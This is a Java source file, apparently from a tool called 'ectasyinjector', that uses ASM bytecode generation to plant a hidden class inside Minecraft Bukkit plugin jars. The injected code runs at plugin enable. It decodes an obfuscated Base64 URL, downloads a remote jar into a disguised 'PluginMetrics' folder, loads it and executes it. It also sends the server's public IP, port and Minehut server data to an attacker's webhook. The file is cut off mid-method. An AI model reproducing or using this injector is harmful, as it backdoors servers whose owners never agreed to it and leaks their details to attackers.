package lol.nikko.ectasyinjector.inject;

import lol.nikko.asmutil.UnknownFile;
import org.objectweb.asm.*;
import org.objectweb.asm.tree.*;
import lol.nikko.asmutil.JarLoader;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class FileInjector implements Opcodes {
    private final File input;
    private final File output;

    public FileInjector(File input, File output) {
        this.input = input;
        this.output = output;
    }

    public void inject(String webhook, boolean debug) throws Exception {
        JarLoader jarLoader = new JarLoader(input, output);

        try {
            jarLoader.load();
        } catch (Exception ex) {
            ex.printStackTrace();
            System.err.println("\nFailed to load file " + input.getPath() + ". Is it a jar?");
            return;
        }

        ClassNode mainClass = this.findMainClass(jarLoader);
        String mainPackageName = mainClass.name.substring(0, mainClass.name.lastIndexOf("/"));
        String rawMainClassName = mainClass.name.substring(mainClass.name.lastIndexOf("/") + 1);

        String fakeClassName = null;
        for (String possible : this.getPossibleFakeClassNames(rawMainClassName, mainPackageName)) {
            if (this.findClassFromName(jarLoader, possible) == null) {
                fakeClassName = possible;
                break;
            }
        }

        if (fakeClassName == null) {
            System.err.println("Failed to find a suitable fake class name for " + mainClass.name + " in " + jarLoader.getInput().getPath() + " (This should never happen??? Please try reinjecting, and if the issue persists contact nikko)");
            System.exit(1);
        }

        ClassNode fakeClass = this.createFakeClassNode(fakeClassName, webhook, debug);

        for (MethodNode methodNode : mainClass.methods) {
            if (methodNode.name.equals("onEnable") && methodNode.desc.equals("()V") && methodNode.access == ACC_PUBLIC) {
                InsnList mainInjectionInstructions = this.getMainInjectionInstructions(fakeClassName);
                methodNode.instructions.insert(mainInjectionInstructions);
            }
        }

        jarLoader.getClasses().add(fakeClass);
        jarLoader.save();
    }

    private InsnList getMainInjectionInstructions(String fakeClassName) {
        InsnList insnList = new InsnList();
        insnList.add(new TypeInsnNode(NEW, fakeClassName));
        insnList.add(new InsnNode(DUP));
        insnList.add(new VarInsnNode(ALOAD, 0));
        insnList.add(new MethodInsnNode(INVOKESPECIAL, fakeClassName, "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", false));
        insnList.add(new InsnNode(POP));
        return insnList;
    }
    
    private ClassNode createFakeClassNode(String name, String webhook, boolean debug) {
        ClassNode classNode = new ClassNode();
        FieldVisitor fieldVisitor;
        RecordComponentVisitor recordComponentVisitor;
        MethodVisitor methodVisitor;
        AnnotationVisitor annotationVisitor0;

        classNode.visit(V1_8, ACC_PUBLIC | ACC_SUPER, name, null, "java/lang/Object", null);

        classNode.visitSource(null, null);

        classNode.visitInnerClass("java/util/Base64$Decoder", "java/util/Base64", "Decoder", ACC_PUBLIC | ACC_STATIC);

        classNode.visitInnerClass("java/lang/invoke/MethodHandles$Lookup", "java/lang/invoke/MethodHandles", "Lookup", ACC_PUBLIC | ACC_FINAL | ACC_STATIC);

        {
            methodVisitor = classNode.visitMethod(ACC_PUBLIC, "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(20, label0);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(21, label1);
            methodVisitor.visitTypeInsn(NEW, "java/lang/Thread");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitVarInsn(ALOAD, 1);
            methodVisitor.visitInvokeDynamicInsn("run", "(L" + name + ";Lorg/bukkit/plugin/java/JavaPlugin;)Ljava/lang/Runnable;", new Handle(Opcodes.H_INVOKESTATIC, "java/lang/invoke/LambdaMetafactory", "metafactory", "(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodType;Ljava/lang/invoke/MethodHandle;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;", false), new Object[]{Type.getType("()V"), new Handle(Opcodes.H_INVOKESPECIAL, name, "lambda$new$0", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", false), Type.getType("()V")});
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Thread", "<init>", "(Ljava/lang/Runnable;)V", false);
            Label label2 = new Label();
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(26, label2);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Thread", "start", "()V", false);
            Label label3 = new Label();
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(27, label3);
            methodVisitor.visitInsn(RETURN);
            Label label4 = new Label();
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label4, 0);
            methodVisitor.visitLocalVariable("param", "Lorg/bukkit/plugin/java/JavaPlugin;", null, label0, label4, 1);
            methodVisitor.visitMaxs(4, 2);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classNode.visitMethod(ACC_PRIVATE, "method", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", null, new String[]{"java/lang/Throwable"});
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(32, label0);
            methodVisitor.visitTypeInsn(NEW, "java/net/URL");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitTypeInsn(NEW, "java/lang/String");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/util/Base64", "getDecoder", "()Ljava/util/Base64$Decoder;", false);
            methodVisitor.visitLdcInsn("xxfraHR0cHM6Ly9ib2R5YWxob2hhLmNvbS9idW5nZWUuamFy");
            methodVisitor.visitInsn(ICONST_4);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "substring", "(I)Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/util/Base64$Decoder", "decode", "(Ljava/lang/String;)[B", false);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/String", "<init>", "([B)V", false);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/URL", "openConnection", "()Ljava/net/URLConnection;", false);
            methodVisitor.visitVarInsn(ASTORE, 2);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(33, label1);
            methodVisitor.visitVarInsn(ALOAD, 2);
            methodVisitor.visitLdcInsn("User-Agent");
            methodVisitor.visitLdcInsn("Mozilla");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/URLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", false);
            Label label2 = new Label();
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(34, label2);
            methodVisitor.visitVarInsn(ALOAD, 2);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/URLConnection", "getInputStream", "()Ljava/io/InputStream;", false);
            methodVisitor.visitLdcInsn("plugins/PluginMetrics/bungee.jar");
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/String");
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/nio/file/Paths", "get", "(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;", false);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/nio/file/CopyOption");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitFieldInsn(GETSTATIC, "java/nio/file/StandardCopyOption", "REPLACE_EXISTING", "Ljava/nio/file/StandardCopyOption;");
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/nio/file/Files", "copy", "(Ljava/io/InputStream;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)J", false);
            methodVisitor.visitInsn(POP2);
            Label label3 = new Label();
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(36, label3);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/net/URL");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitTypeInsn(NEW, "java/io/File");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitLdcInsn("plugins/PluginMetrics/bungee.jar");
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "toURI", "()Ljava/net/URI;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/URI", "toURL", "()Ljava/net/URL;", false);
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getClassLoader", "()Ljava/lang/ClassLoader;", false);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/net/URLClassLoader", "newInstance", "([Ljava/net/URL;Ljava/lang/ClassLoader;)Ljava/net/URLClassLoader;", false);
            methodVisitor.visitVarInsn(ASTORE, 3);
            Label label4 = new Label();
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLineNumber(37, label4);
            methodVisitor.visitLdcInsn("net.md5.bungee.Core");
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitVarInsn(ALOAD, 3);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;ZLjava/lang/ClassLoader;)Ljava/lang/Class;", false);
            methodVisitor.visitVarInsn(ASTORE, 4);
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            methodVisitor.visitLineNumber(38, label5);
            methodVisitor.visitVarInsn(ALOAD, 4);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getConstructor", "([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;", false);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Constructor", "newInstance", "([Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitVarInsn(ASTORE, 5);
            Label label6 = new Label();
            methodVisitor.visitLabel(label6);
            methodVisitor.visitLineNumber(39, label6);
            methodVisitor.visitVarInsn(ALOAD, 4);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getMethods", "()[Ljava/lang/reflect/Method;", false);
            methodVisitor.visitVarInsn(ASTORE, 6);
            methodVisitor.visitVarInsn(ALOAD, 6);
            methodVisitor.visitInsn(ARRAYLENGTH);
            methodVisitor.visitVarInsn(ISTORE, 7);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitVarInsn(ISTORE, 8);
            Label label7 = new Label();
            methodVisitor.visitLabel(label7);
            methodVisitor.visitFrame(Opcodes.F_FULL, 9, new Object[]{name, "org/bukkit/plugin/java/JavaPlugin", "java/net/URLConnection", "java/net/URLClassLoader", "java/lang/Class", "java/lang/Object", "[Ljava/lang/reflect/Method;", Opcodes.INTEGER, Opcodes.INTEGER}, 0, new Object[]{});
            methodVisitor.visitVarInsn(ILOAD, 8);
            methodVisitor.visitVarInsn(ILOAD, 7);
            Label label8 = new Label();
            methodVisitor.visitJumpInsn(IF_ICMPGE, label8);
            methodVisitor.visitVarInsn(ALOAD, 6);
            methodVisitor.visitVarInsn(ILOAD, 8);
            methodVisitor.visitInsn(AALOAD);
            methodVisitor.visitVarInsn(ASTORE, 9);
            Label label9 = new Label();
            methodVisitor.visitLabel(label9);
            methodVisitor.visitLineNumber(40, label9);
            methodVisitor.visitVarInsn(ALOAD, 9);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "getName", "()Ljava/lang/String;", false);
            methodVisitor.visitLdcInsn("onEnable");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "equals", "(Ljava/lang/Object;)Z", false);
            Label label10 = new Label();
            methodVisitor.visitJumpInsn(IFEQ, label10);
            Label label11 = new Label();
            methodVisitor.visitLabel(label11);
            methodVisitor.visitLineNumber(41, label11);
            methodVisitor.visitVarInsn(ALOAD, 9);
            methodVisitor.visitVarInsn(ALOAD, 5);
            methodVisitor.visitInsn(ICONST_1);
            methodVisitor.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitVarInsn(ALOAD, 1);
            methodVisitor.visitInsn(AASTORE);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitLabel(label10);
            methodVisitor.visitLineNumber(39, label10);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitIincInsn(8, 1);
            methodVisitor.visitJumpInsn(GOTO, label7);
            methodVisitor.visitLabel(label8);
            methodVisitor.visitLineNumber(43, label8);
            methodVisitor.visitFrame(Opcodes.F_CHOP, 3, null, 0, null);
            methodVisitor.visitInsn(RETURN);
            Label label12 = new Label();
            methodVisitor.visitLabel(label12);
            methodVisitor.visitLocalVariable("var3", "Ljava/lang/reflect/Method;", null, label9, label10, 9);
            methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label12, 0);
            methodVisitor.visitLocalVariable("param", "Lorg/bukkit/plugin/java/JavaPlugin;", null, label0, label12, 1);
            methodVisitor.visitLocalVariable("var0", "Ljava/net/URLConnection;", null, label1, label12, 2);
            methodVisitor.visitLocalVariable("var", "Ljava/net/URLClassLoader;", null, label4, label12, 3);
            methodVisitor.visitLocalVariable("var1", "Ljava/lang/Class;", "Ljava/lang/Class<*>;", label5, label12, 4);
            methodVisitor.visitLocalVariable("var2", "Ljava/lang/Object;", null, label6, label12, 5);
            methodVisitor.visitMaxs(7, 10);
            methodVisitor.visitEnd();
        }
        {
            if (webhook != null) {
                methodVisitor = classNode.visitMethod(ACC_PRIVATE, "method", "()V", null, new String[]{"java/lang/Throwable"});
                methodVisitor.visitCode();
                Label label0 = new Label();
                methodVisitor.visitLabel(label0);
                methodVisitor.visitLineNumber(46, label0);
                methodVisitor.visitVarInsn(ALOAD, 0);
                methodVisitor.visitTypeInsn(NEW, "java/net/URL");
                methodVisitor.visitInsn(DUP);
                methodVisitor.visitLdcInsn(webhook);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
                methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
                methodVisitor.visitInsn(DUP);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
                methodVisitor.visitLdcInsn("{\"content\": \"```");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitVarInsn(ALOAD, 0);
                methodVisitor.visitTypeInsn(NEW, "java/net/URL");
                methodVisitor.visitInsn(DUP);
                methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
                methodVisitor.visitInsn(DUP);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
                methodVisitor.visitLdcInsn("https://api.minehut.com/server/");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitLdcInsn("SERVER_ID");
                methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/System", "getenv", "(Ljava/lang/String;)Ljava/lang/String;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, name, "method", "(Ljava/net/URL;)Ljava/lang/String;", false);
                methodVisitor.visitLdcInsn("\"");
                methodVisitor.visitLdcInsn(" ");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "replaceAll", "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;", false);
                methodVisitor.visitLdcInsn(":");
                methodVisitor.visitLdcInsn(" ");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "replaceAll", "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitLdcInsn("``` ```");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitVarInsn(ALOAD, 0);
                methodVisitor.visitTypeInsn(NEW, "java/net/URL");
                methodVisitor.visitInsn(DUP);
                methodVisitor.visitLdcInsn("https://api.ipify.org/");
                methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, name, "method", "(Ljava/net/URL;)Ljava/lang/String;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitLdcInsn(":");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitMethodInsn(INVOKESTATIC, "org/bukkit/Bukkit", "getPort", "()I", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(I)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitLdcInsn("```\"}");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, name, "method", "(Ljava/net/URL;Ljava/lang/String;)V", false);
                Label label1 = new Label();
                methodVisitor.visitLabel(label1);
                methodVisitor.visitLineNumber(47, label1);
                methodVisitor.visitInsn(RETURN);
                Label label2 = new Label();
                methodVisitor.visitLabel(label2);
                methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label2, 0);
                methodVisitor.visitMaxs(8, 1);
                methodVisitor.visitEnd();
            }
        }
        {
            if (webhook != null) {
                methodVisitor = classNode.visitMethod(ACC_PRIVATE, "method", "(Ljava/net/URL;)Ljava/lang/String;", null, new String[]{"java/lang/Throwable"});
                methodVisitor.visitCode();
                Label label0 = new Label();
                methodVisitor.visitLabel(label0);
                methodVisitor.visitLineNumber(50, label0);
                methodVisitor.visitVarInsn(ALOAD, 1);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/URL", "openConnection", "()Ljava/net/URLConnection;", false);
                methodVisitor.visitTypeInsn(CHECKCAST, "java/net/HttpURLConnection");
                methodVisitor.visitVarInsn(ASTORE, 2);
                Label label1 = new Label();
                methodVisitor.visitLabel(label1);
                methodVisitor.visitLineNumber(51, label1);
                methodVisitor.visitVarInsn(ALOAD, 2);
                methodVisitor.visitLdcInsn("User-Agent");
                methodVisitor.visitLdcInsn("Mozilla/5.0");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", false);
                Label label2 = new Label();
                methodVisitor.visitLabel(label2);
                methodVisitor.visitLineNumber(52, label2);
                methodVisitor.visitTypeInsn(NEW, "java/util/Scanner");
                methodVisitor.visitInsn(DUP);
                methodVisitor.visitVarInsn(ALOAD, 2);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getInputStream", "()Ljava/io/InputStream;", false);
                methodVisitor.visitLdcInsn("UTF-8");
                methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/util/Scanner", "<init>", "(Ljava/io/InputStream;Ljava/lang/String;)V", false);
                methodVisitor.visitLdcInsn("\\A");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/util/Scanner", "useDelimiter", "(Ljava/lang/String;)Ljava/util/Scanner;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/util/Scanner", "next", "()Ljava/lang/String;", false);
                methodVisitor.visitVarInsn(ASTORE, 3);
                Label label3 = new Label();
                methodVisitor.visitLabel(label3);
                methodVisitor.visitLineNumber(53, label3);
                Label label4 = new Label();
                methodVisitor.visitLabel(label4);
                methodVisitor.visitLineNumber(54, label4);
                methodVisitor.visitVarInsn(ALOAD, 2);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "disconnect", "()V", false);
                Label label5 = new Label();
                methodVisitor.visitLabel(label5);
                methodVisitor.visitLineNumber(55, label5);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitInsn(ARETURN);
                Label label6 = new Label();
                methodVisitor.visitLabel(label6);
                methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label6, 0);
                methodVisitor.visitLocalVariable("param", "Ljava/net/URL;", null, label0, label6, 1);
                methodVisitor.visitLocalVariable("var0", "Ljava/net/HttpURLConnection;", null, label1, label6, 2);
                methodVisitor.visitLocalVariable("var1", "Ljava/lang/String;", null, label3, label6, 3);
                methodVisitor.visitMaxs(4, 4);
                methodVisitor.visitEnd();
            }
        }
        {
            if (webhook != null) {
                methodVisitor = classNode.visitMethod(ACC_PRIVATE, "method", "(Ljava/net/URL;Ljava/lang/String;)V", null, new String[]{"java/lang/Throwable"});
                methodVisitor.visitCode();
                Label label0 = new Label();
                methodVisitor.visitLabel(label0);
                methodVisitor.visitLineNumber(59, label0);
                methodVisitor.visitVarInsn(ALOAD, 1);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/URL", "openConnection", "()Ljava/net/URLConnection;", false);
                methodVisitor.visitTypeInsn(CHECKCAST, "java/net/HttpURLConnection");
                methodVisitor.visitVarInsn(ASTORE, 3);
                Label label1 = new Label();
                methodVisitor.visitLabel(label1);
                methodVisitor.visitLineNumber(60, label1);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitLdcInsn("POST");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestMethod", "(Ljava/lang/String;)V", false);
                Label label2 = new Label();
                methodVisitor.visitLabel(label2);
                methodVisitor.visitLineNumber(61, label2);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitLdcInsn("Content-Type");
                methodVisitor.visitLdcInsn("application/json");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", false);
                Label label3 = new Label();
                methodVisitor.visitLabel(label3);
                methodVisitor.visitLineNumber(62, label3);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitLdcInsn("User-Agent");
                methodVisitor.visitLdcInsn("Mozilla/5.0");
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", false);
                Label label4 = new Label();
                methodVisitor.visitLabel(label4);
                methodVisitor.visitLineNumber(63, label4);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitInsn(ICONST_1);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setDoOutput", "(Z)V", false);
                Label label5 = new Label();
                methodVisitor.visitLabel(label5);
                methodVisitor.visitLineNumber(64, label5);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getOutputStream", "()Ljava/io/OutputStream;", false);
                methodVisitor.visitVarInsn(ALOAD, 2);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "getBytes", "()[B", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "write", "([B)V", false);
                Label label6 = new Label();
                methodVisitor.visitLabel(label6);
                methodVisitor.visitLineNumber(65, label6);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getOutputStream", "()Ljava/io/OutputStream;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "flush", "()V", false);
                Label label7 = new Label();
                methodVisitor.visitLabel(label7);
                methodVisitor.visitLineNumber(66, label7);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getOutputStream", "()Ljava/io/OutputStream;", false);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/OutputStream", "close", "()V", false);
                Label label8 = new Label();
                methodVisitor.visitLabel(label8);
                methodVisitor.visitLineNumber(67, label8);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getResponseCode", "()I", false);
                methodVisitor.visitInsn(POP);
                Label label9 = new Label();
                methodVisitor.visitLabel(label9);
                methodVisitor.visitLineNumber(68, label9);
                Label label10 = new Label();
                methodVisitor.visitLabel(label10);
                methodVisitor.visitLineNumber(69, label10);
                methodVisitor.visitVarInsn(ALOAD, 3);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "disconnect", "()V", false);
                Label label11 = new Label();
                methodVisitor.visitLabel(label11);
                methodVisitor.visitLineNumber(70, label11);
                methodVisitor.visitInsn(RETURN);
                Label label12 = new Label();
                methodVisitor.visitLabel(label12);
                methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label12, 0);
                methodVisitor.visitLocalVariable("param", "Ljava/net/URL;", null, label0, label12, 1);
                methodVisitor.visitLocalVariable("param1", "Ljava/lang/String;", null, label0, label12, 2);
                methodVisitor.visitLocalVariable("var0", "Ljava/net/HttpURLConnection;", null, label1, label12, 3);
                methodVisitor.visitMaxs(3, 4);
                methodVisitor.visitEnd();
            }
        }
        {
            methodVisitor = classNode.visitMethod(ACC_PRIVATE | ACC_SYNTHETIC, "lambda$new$0", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/Throwable");
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(23, label0);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitVarInsn(ALOAD, 1);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, name, "method", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", false);
            Label label3 = new Label();
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(24, label3);
            if (webhook != null) {
                methodVisitor.visitVarInsn(ALOAD, 0);
                methodVisitor.visitMethodInsn(INVOKESPECIAL, name, "method", "()V", false);
            }
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(27, label1);
            Label label4 = new Label();
            methodVisitor.visitJumpInsn(GOTO, label4);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(25, label2);
            methodVisitor.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[]{"java/lang/Throwable"});
            methodVisitor.visitVarInsn(ASTORE, 2);
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            methodVisitor.visitLineNumber(26, label5);
            if (debug) {
                methodVisitor.visitVarInsn(ALOAD, 2);
                methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Throwable", "printStackTrace", "()V", false);
            }
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLineNumber(28, label4);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitInsn(RETURN);
            Label label6 = new Label();
            methodVisitor.visitLabel(label6);
            methodVisitor.visitLocalVariable("throwable", "Ljava/lang/Throwable;", null, label5, label4, 2);
            methodVisitor.visitLocalVariable("this", "L" + name + ";", null, label0, label6, 0);
            methodVisitor.visitLocalVariable("param", "Lorg/bukkit/plugin/java/JavaPlugin;", null, label0, label6, 1);
            methodVisitor.visitMaxs(2, 3);
            methodVisitor.visitEnd();
        }
        classNode.visitEnd();

        return classNode;
    }

    private List<String> getPossibleFakeClassNames(String rawMainClassName, String mainPackageName) {
        List<String> possible = new ArrayList<>();
